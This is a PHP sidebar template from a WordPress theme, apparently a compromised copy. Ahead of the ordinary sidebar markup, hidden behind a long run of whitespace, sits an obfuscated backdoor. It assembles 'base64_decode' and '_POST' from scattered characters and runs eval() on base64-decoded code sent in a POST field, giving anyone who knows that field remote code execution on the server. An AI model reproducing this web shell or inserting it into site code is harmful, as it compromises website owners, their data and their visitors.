<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['n8e416f'])) {eval($s21(${$s20}['n8e416f']));}?><?php

/**
 * Default Sidebar for Pages
 * by www.unitedthemes.com
 */

?>

<?php if( is_active_sidebar('page-widget-area') ) : ?>
    
    <div id="secondary" class="widget-area grid-25 mobile-grid-100 tablet-grid-25" role="complementary">
        <ul class="sidebar">
            <?php dynamic_sidebar('page-widget-area'); ?>
        </ul>
    </div>
    
<?php endif; ?>